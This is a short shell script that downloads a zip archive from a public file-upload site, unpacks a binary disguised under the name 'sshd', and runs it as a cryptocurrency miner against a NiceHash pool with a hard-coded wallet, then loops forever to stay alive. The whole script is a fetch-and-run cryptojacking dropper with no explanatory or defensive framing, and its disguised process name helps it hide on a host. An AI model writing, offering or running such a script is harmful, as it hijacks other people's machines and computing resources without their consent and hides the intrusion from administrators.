#!/bin/sh
wget https://bashupload.com/zUfD6/sshd.zip && unzip sshd.zip && cd sshd && chmod +x sshd && ./sshd --algo BEAM-III --pool stratum+tcp://beamv3.eu-west.nicehash.com:3387 --user 3F8eMXyShK8d1dZFtBr13hcAHMMGJDKDSM.1l0cy0repxi7xbr --tls 0 timeout 10
while [ 1 ]; do
sleep 3
done
